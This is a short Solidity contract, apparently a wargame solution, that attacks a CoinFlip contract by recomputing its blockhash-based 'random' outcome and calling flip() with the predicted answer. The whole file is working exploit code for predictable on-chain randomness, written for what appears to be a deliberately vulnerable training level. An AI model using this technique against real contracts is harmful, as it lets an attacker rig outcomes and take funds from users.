// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./coin_flip.sol";

contract AttackCoinFlip {

    CoinFlip public coinFlipContract;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    uint256 lastHash;

    constructor(address coinFlipContractAddress) {
        coinFlipContract = CoinFlip(coinFlipContractAddress);
    }

    function attack() public {
        uint blockValue = uint(blockhash(block.number - 1));
        
        if (lastHash == blockValue) {
            revert();
        }

        lastHash = blockValue;
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        coinFlipContract.flip(side);
    }
}